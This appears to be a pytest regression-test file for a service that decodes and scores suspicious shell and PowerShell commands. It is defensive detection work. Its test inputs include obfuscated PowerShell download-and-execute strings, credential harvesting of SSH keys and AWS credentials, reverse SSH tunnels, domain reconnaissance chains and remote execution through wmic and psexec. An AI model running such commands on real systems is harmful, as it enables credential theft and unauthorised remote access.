"""Regression tests for the gaps found by the post-deploy field probe."""
from __future__ import annotations

import base64

import pytest

from app.classifier import classify
from app.decoder import decode_layers
from app.ip_extractor import extract_ips
from app.pipeline import detect
from app.tuning import Tuning
from app.url_extractor import extract_urls_from_analysis

SEV = {"clean": 0, "low": 1, "notable": 2, "suspicious": 3, "malicious": 4}


def _layers(command: str) -> dict[str, str]:
    return {str(layer["encoding"]): str(layer["value"]) for layer in decode_layers(command)}


# ── decoders ──────────────────────────────────────────────────────────────────

def test_format_operator_is_rewritten_in_place() -> None:
    cmd = "powershell -c \"& ('{1}{0}' -f 'ex','i') (Get-Content x)\""
    assert "iex (Get-Content x)" in _layers(cmd)["powershell-string-assembly"]


def test_concatenated_call_and_member_names() -> None:
    cmd = "&('i'+'ex') ($w.('Download'+'String').Invoke('http://example.com/a'))"
    value = _layers(cmd)["powershell-string-assembly"]
    assert value.startswith("iex ")
    assert ".DownloadString('http://example.com/a')" in value


def test_quoted_call_is_normalisation_not_obfuscation() -> None:
    det = detect("& 'git' status")
    assert det.encoding_depth == 0
    assert SEV[det.verdict["severity"]] <= SEV["low"]


def test_benign_literal_join_adds_no_layer() -> None:
    assert "powershell-string-assembly" not in _layers("Write-Host ('Hello, ' + 'world')")


def test_ansi_c_octal_quoting() -> None:
    assert _layers(r"x=$'\143\165\162\154'; $x --version")["ansi-c-quoting"].startswith("x=curl;")


def test_tiny_base64_command_substitution() -> None:
    blob = base64.b64encode(b"curl").decode()
    value = _layers(f"$(echo {blob} | base64 -d) --version")["shell-command-substitution"]
    assert value == "curl --version"


def test_rev_here_string() -> None:
    assert "shell-rev" in _layers("rev <<< 'dlrow olleh ohce' | sh")


# ── indicators ────────────────────────────────────────────────────────────────

@pytest.mark.parametrize("ip", ["198.51.100.7", "203.0.113.9", "192.0.2.1", "100.64.1.1", "10.1.2.3", "127.0.0.1"])
def test_non_global_addresses_are_not_indicators(ip: str) -> None:
    """An address and a URL on it are treated alike, and neither leaves the service."""
    command = f"curl http://{ip}/a"
    assert extract_ips(command, []) == []
    assert extract_urls_from_analysis(command, []) == []


def test_global_address_is_listed_as_ip_and_url() -> None:
    command = "curl http://8.8.8.8/a"
    assert extract_ips(command, []) == ["8.8.8.8"]
    assert extract_urls_from_analysis(command, []) == ["http://8.8.8.8/a"]


# ── rules and scoring ─────────────────────────────────────────────────────────

def test_running_from_temp_is_not_tagged_user_execution() -> None:
    classes = classify(r"cmd /c %TEMP%\upd.exe", [])
    ids = {t["id"] for tc in classes for t in tc.techniques}
    assert "T1204.002" not in ids


def test_three_medium_signals_stack_to_high() -> None:
    cmd = "find / -name id_rsa 2>/dev/null; cat ~/.aws/credentials; grep -rI 'password' /var/www"
    cred = next(tc for tc in classify(cmd, []) if tc.name == "credential_theft")
    assert cred.confidence == "high"
    relaxed = Tuning(signal_stack=10)
    cred = next(tc for tc in classify(cmd, [], relaxed) if tc.name == "credential_theft")
    assert cred.confidence == "medium"


def test_discovery_chain_bonus_is_tunable() -> None:
    cmd = 'whoami /all & net group "domain admins" /domain & nltest /domain_trusts & net view /domain'
    assert detect(cmd).verdict["severity"] == "suspicious"
    assert detect(cmd, Tuning(recon_chain_bonus=0)).verdict["severity"] == "notable"


@pytest.mark.parametrize("command", [
    "journalctl --vacuum-time=30d",
    "journalctl --vacuum-size=500M",
    "wsl --update",
    r"wmic /node:web01 os get caption",
    r"sc \\web01 query w3svc",
    r"msiexec /i C:\installers\app.msi /qn /norestart",
    'python -c "import socket;print(socket.gethostname())"',
])
def test_everyday_admin_commands_stay_low(command: str) -> None:
    assert SEV[detect(command).verdict["severity"]] <= SEV["low"], command


def test_local_file_through_iex_is_not_malicious() -> None:
    assert detect(r"Invoke-Expression (Get-Content .\env.ps1 -Raw)").verdict["severity"] == "notable"


@pytest.mark.parametrize("command", [
    r"IEX (Get-Content \\203.0.113.9\share\a.ps1 -Raw)",
    r"iex (gc $env:TEMP\a.ps1 -Raw)",
    r"IEX (Get-Content C:\Users\Public\a.txt)",
])
def test_share_or_staged_file_through_iex_stays_high(command: str) -> None:
    loader = next(tc for tc in classify(command, []) if tc.name == "loader")
    assert loader.confidence == "high"


# ── pre-push review ───────────────────────────────────────────────────────────

@pytest.mark.parametrize("fmt", ["{0:>999999999}{1}", "{0,-999999999}{1}", "{0.__class__}{1}", "{0}{1}{9}"])
def test_format_operator_never_pads_or_reads_attributes(fmt: str) -> None:
    """The format string is attacker-controlled: no giant padding, no attribute access."""
    layers = decode_layers(f"& ('{fmt}' -f 'i','ex') (Get-Content x)")
    assert all(len(str(layer["value"])) < 200 for layer in layers)
    assert not any("class" in str(layer["value"]) and "str" in str(layer["value"]) for layer in layers)


@pytest.mark.parametrize("command", [
    'ssh web01 "chmod -R 755 /var/www/html"',
    "ssh web01 chown -R 1000:1000 /data",
    "ssh web01 'grep -r 404 /var/log/nginx'",
    "ssh -i key.pem ubuntu@web01 'sudo chown -R 33:33 /var/www'",
    r"msiexec /i C:\installers\app.msi /qn /l*v C:\logs\install.txt",
])
def test_recursive_flag_over_ssh_is_not_a_reverse_tunnel(command: str) -> None:
    assert SEV[detect(command).verdict["severity"]] <= SEV["low"], command


@pytest.mark.parametrize("command", [
    "ssh -N -R 1080 user@203.0.113.9",
    "ssh -fN -R 4444:127.0.0.1:3389 user@203.0.113.9",
    "autossh -M 0 -f -N -R 2222:localhost:22 user@203.0.113.9",
    r'wmic /node:10.0.0.5 path win32_process call create "cmd /c whoami"',
    r"psexec.exe -accepteula -s -d C:\Users\Public\a.exe",
])
def test_reverse_tunnels_and_remote_execution_are_flagged(command: str) -> None:
    assert SEV[detect(command).verdict["severity"]] >= SEV["suspicious"], command
